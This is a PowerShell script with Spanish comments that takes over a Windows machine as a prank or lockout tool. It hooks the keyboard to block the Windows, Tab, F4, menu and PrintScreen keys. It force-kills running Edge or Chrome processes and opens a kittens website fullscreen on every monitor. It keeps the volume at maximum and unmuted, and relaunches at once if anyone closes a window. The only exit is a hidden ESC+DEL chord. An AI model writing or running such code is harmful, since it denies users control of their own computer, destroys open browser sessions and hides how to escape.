<#
  run.ps1 - Gatitos en TODAS las pantallas
  Única salida: ESC + DEL
  Reopen casi instantáneo
#>

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

$pageUrl = 'https://gatitos-eight.vercel.app'
$titulo  = 'Gatitos'
$basePerfil = Join-Path $env:TEMP 'venice_kiosk'

# ---------------- Bloqueo de teclas + ESC+DEL ----------------
Add-Type -TypeDefinition @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class KeyBlocker {
  private const int WH_KEYBOARD_LL = 13;
  private const int WM_KEYDOWN = 0x0100;
  private const int WM_SYSKEYDOWN = 0x0104;
  private static LowLevelKeyboardProc _proc = HookCallback;
  private static IntPtr _hookID = IntPtr.Zero;

  public static long lastEsc = 0;
  public static long lastDel = 0;
  public static bool shouldExit = false;

  public static void Start() { _hookID = SetHook(_proc); }
  public static void Stop()  { UnhookWindowsHookEx(_hookID); }

  private static IntPtr SetHook(LowLevelKeyboardProc proc) {
    using (Process curProcess = Process.GetCurrentProcess())
    using (ProcessModule curModule = curProcess.MainModule) {
      return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
    }
  }

  private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

  private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
    if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
      int vk = Marshal.ReadInt32(lParam);
      long now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

      if (vk == 0x1B) { // ESC
        lastEsc = now;
        if (now - lastDel < 700) shouldExit = true;
      }
      if (vk == 0x2E) { // DEL
        lastDel = now;
        if (now - lastEsc < 700) shouldExit = true;
      }

      // Bloquear teclas peligrosas
      if (vk == 0x5B || vk == 0x5C || vk == 0x73 || vk == 0x09 || vk == 0x5D || vk == 0x2C) {
        return (IntPtr)1;
      }
    }
    return CallNextHookEx(_hookID, nCode, wParam, lParam);
  }

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool UnhookWindowsHookEx(IntPtr hhk);
  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
  [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr GetModuleHandle(string lpModuleName);
}
'@

# ---------------- Volumen ----------------
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDevEnum { }
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator { int _1(); int GetDefaultAudioEndpoint(int flow, int role, out IMMDevice dev); }
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice { int Activate(ref Guid iid, int ctx, IntPtr p, [MarshalAs(UnmanagedType.IUnknown)] out object o); }
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {
  int _1(); int _2(); int _3();
  int SetMasterVolumeLevel(float f, IntPtr c);
  int SetMasterVolumeLevelScalar(float f, IntPtr c);
  int GetMasterVolumeLevel(out float f);
  int GetMasterVolumeLevelScalar(out float f);
  int _8(); int _9(); int _10(); int _11();
  int SetMute(int m, IntPtr c);
  int GetMute(out int m);
}
public static class Vol {
  static IAudioEndpointVolume V() {
    var e = (IMMDeviceEnumerator)(new MMDevEnum());
    IMMDevice d; e.GetDefaultAudioEndpoint(0, 1, out d);
    Guid iid = typeof(IAudioEndpointVolume).GUID;
    object o; d.Activate(ref iid, 1, IntPtr.Zero, out o);
    return (IAudioEndpointVolume)o;
  }
  public static void Set(float v) { var a = V(); a.SetMasterVolumeLevelScalar(v, IntPtr.Zero); a.SetMute(0, IntPtr.Zero); }
}
'@

# ---------------- Obtener todas las pantallas ----------------
Add-Type -AssemblyName System.Windows.Forms
$screens = [System.Windows.Forms.Screen]::AllScreens

# ---------------- Navegador ----------------
function Get-Nav {
  $c = @(
    "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe",
    "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe",
    "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
    "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
    "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
  )
  foreach ($p in $c) { if (Test-Path $p) { return $p } }
  return $null
}

$nav = Get-Nav
if (-not $nav) { Write-Host "No se encontró Edge ni Chrome"; exit }
$procName = [IO.Path]::GetFileNameWithoutExtension($nav)

# Guardar los PIDs de cada monitor
$script:pids = @{}

function LanzarEnTodas {
  # Cerrar instancias anteriores
  Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
  Start-Sleep -Milliseconds 200
  $script:pids = @{}

  $i = 0
  foreach ($screen in $screens) {
    $i++
    $perfil = "$basePerfil`_$i"
    $x = $screen.Bounds.X
    $y = $screen.Bounds.Y
    $w = $screen.Bounds.Width
    $h = $screen.Bounds.Height

    $flags = "--kiosk `"$pageUrl`" --user-data-dir=`"$perfil`" --no-first-run " +
             "--no-default-browser-check --disable-session-crashed-bubble --noerrdialogs " +
             "--autoplay-policy=no-user-gesture-required --disable-infobars " +
             "--window-position=$x,$y --window-size=$w,$h " +
             "--disable-features=Translate,msEdgeWelcomePage,EdgeCollections,msEdgeSidebarV2"

    if ($nav -match 'msedge') { $flags += ' --edge-kiosk-type=fullscreen' }

    $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
    if ($p) { $script:pids[$i] = $p.Id }
  }
}

# Iniciar
[KeyBlocker]::Start()
LanzarEnTodas
Start-Sleep -Milliseconds 900

try {
  while ($true) {
    if ([KeyBlocker]::shouldExit) { break }

    [Vol]::Set(1.0)

    # Contar cuántas ventanas del navegador siguen vivas
    $vivos = 0
    $procs = Get-Process -Name $procName -ErrorAction SilentlyContinue
    foreach ($p in $procs) {
      if ($script:pids.Values -contains $p.Id -or $p.MainWindowTitle -like "*$titulo*") {
        $vivos++
      }
    }

    # Si faltan pantallas → relanzar todas
    if ($vivos -lt $screens.Count) {
      LanzarEnTodas
      Start-Sleep -Milliseconds 400
    }

    Start-Sleep -Milliseconds 80
  }
}
finally {
  [KeyBlocker]::Stop()
  Get-Process -Name $procName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}
